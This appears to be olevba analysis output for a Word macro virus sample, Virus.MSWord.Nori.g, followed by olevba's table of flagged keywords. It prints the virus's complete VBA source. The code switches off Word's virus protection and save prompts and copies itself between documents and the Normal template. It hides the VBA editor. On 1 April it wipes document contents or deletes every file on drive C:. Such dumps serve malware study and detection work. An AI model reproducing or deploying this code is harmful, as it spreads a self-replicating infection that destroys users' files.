olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nori.g
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nori.g - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Unit.bas 
in file: Virus.MSWord.Nori.g - OLE stream: 'Macros/VBA/Unit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
                                                                                                Sub ToN()
'Iron
                                                                                                On Error Resume Next
                                                                                                file = "c:\Iron.tmp"
                                                                                                Un = "Unit"

                                                                                                With NormalTemplate.VBProject.VBComponents
   .import (file)
                                                                                                 NormalTemplate.Save
                                                                                                    Kill (file)
                                                                                                End With
                                                                                                End Sub
                                                                                                Sub ToA()
                                                                                                On Error Resume Next
                                                                                                file = "c:\Iron.tmp"
                                                                                                Un = "Unit"
                                                                                                With ActiveDocument.VBProject.VBComponents
                                                                                                                                          '18
                                                                                                End With
                                                                                                End Sub
                                                                                                Sub AutoOpen()
                                                                                                On Error Resume Next
                                                                                                If Options.VirusProtection Then Options.VirusProtection = Not Options.VirusProtection
                                                                                                If Options.ConfirmConversions Then Options.ConfirmConversions = Not Options.ConfirmConversions
                                                                                                If Options.SaveNormalPrompt Then Options.SaveNormalPrompt = Not Options.SaveNormalPrompt
                                                                                                file = "c:\Iron.tmp"
                                                                                                Un = "Unit"
                                                                                                If NormalTemplate.VBProject.VBComponents.Item(Un).CodeModule.Lines(2, 1) <> "'Iron" Then
                                                                                                ActiveDocument.VBProject.VBComponents(Un).Export (file)
                                                                                                With ActiveDocument.VBProject.VBComponents(Un).CodeModule
                                                                                                    .DeleteLines 8
                                                                                                    .InsertLines 8, "   .import (file)"
                                                                                                End With
                                                                                                Call ToN
                                                                                                With ActiveDocument.VBProject.VBComponents(Un).CodeModule
                                                                                                    .DeleteLines 8
                                                                                                    .InsertLines 8, "                                                                                                               '8"
                                                                                                End With
                                                                                                End If
                                                                                                If ActiveDocument.VBProject.VBComponents.Item(Un).CodeModule.Lines(2, 1) <> "'Iron" Then
                                                                                                    NormalTemplate.VBProject.VBComponents(Un).Export (file)
                                                                                                    With NormalTemplate.VBProject.VBComponents(Un).CodeModule
                                                                                                        .DeleteLines 18
                                                                                                        .InsertLines 18, "   ActiveDocument.VBProject.VBComponents.import (file)"
                                                                                                    End With
                                                                                                    Call ToA
                                                                                                    With NormalTemplate.VBProject.VBComponents(Un).CodeModule
                                                                                                        .DeleteLines 18
                                                                                                        .InsertLines 18, "                                                                                                                                          '18"
                                                                                                    End With
                                                                                                    NormalTemplate.Save
                                                                                                End If
                                     
                                                                                                End Sub
                                                                                                Sub AutoClose()
                                                                                                    On Error Resume Next
                                                                                                    Call AutoOpen
                                                                                                  ActiveDocument.SaveAs ActiveDocument.FullName
                                                                                                  If (Day(Now()) = 1) And (Month(Now()) = 4) Then
                                                                                                    If UCase(System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization")) = "IRON" Then
                                                                                                     With Application.FileSearch
                                                                                                      .NewSearch
                                                                                                      .LookIn = "C:\"
                                                                                                      .SearchSubFolders = True
                                                                                                      .FileName = "*.*"
                                                                                                      .MatchTextExactly = False
                                                                                                      .FileType = msoFileTypeAllFiles
                                                                                                      If .Execute > 0 Then
                                                                                                        For i = 1 To .FoundFiles.Count
                                                                                                          Kill .FoundFiles(i)
                                                                                                        Next i
                                                                                                      End If
                                                                                                    End With
                                                                                                    Else
                                                                                                      Selection.WholeStory
                                                                                                      Selection.Delete
                                                                                                      ActiveDocument.SaveAs ActiveDocument.FullName
                                                                                                  End If
                                                                                                  End If
                                                                                                End Sub
                                                                                                Sub ViewVBCode()
                                                                                                  On Error Resume Next
                                                                                                  Application.ShowVisualBasicEditor = False
                                                                                                End Sub
                                                                                                Private Sub Document_New()
                                                                                                 Call AutoOpen
                                                                                                End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

